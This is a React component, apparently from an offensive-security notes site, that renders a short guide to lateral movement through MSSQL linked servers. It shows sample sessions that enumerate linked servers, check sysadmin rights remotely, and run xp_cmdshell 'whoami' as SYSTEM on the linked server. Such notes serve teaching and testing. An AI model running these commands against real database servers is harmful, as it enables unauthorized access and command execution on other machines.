import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const MSSQL_Linked_Databases = ({ title }: IProps) => {

    const step1 = `
    SQL (josh  guest@master)> SELECT srvname, isremote FROM sysservers
    srvname                 isremote   
    ---------------------   --------   
    WINSRV02\\SQLEXPRESS            1   
    LOCAL.TEST.LINKED.SRV          0`


    const step2 = `
    SQL (josh  guest@master)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
    
    ------------------------------ ------------------------------ ------------------------------ -----------
    DESKTOP-0L9D4KA\\LOCAL.TEST.LINKED.SRV     Microsoft SQL Server 2019 (RTM sa_remote                                1`

    const step3 = `
    SQL (josh  guest@master)> EXECUTE('xp_cmdshell "whoami"') AT [LOCAL.TEST.LINKED.SRV]

    -------------------   
    nt authority\system   `

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
              <Box pt={5} />
              <Typography variant="h6">
                    Description
                </Typography>


              <Typography>
              MSSQL has a configuration option called linked servers. f we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
               </Typography>
               <Box pt={5} />
               <Typography>
                Step 1: Check if there are any linked databases (If the isremote value is 0, then it is a linked server)
               </Typography>
                <SyntaxHighlighter className="syntax" language="sql">
              {step1}
            </SyntaxHighlighter>
            <Box pt={5} />
               <Typography>
                Step 2: The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets ([ ]).
               </Typography>
                <SyntaxHighlighter className="syntax" language="sql">
              {step2}
            </SyntaxHighlighter>
            <Box pt={5} />
               <Typography>
                Step 3: If we have sysadmin privileges in the linked database, then we can enable and execute xp_cmdshell on that database.
               </Typography>
                <SyntaxHighlighter className="syntax" language="sql">
              {step3}
            </SyntaxHighlighter>
            </Typography>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default MSSQL_Linked_Databases;
  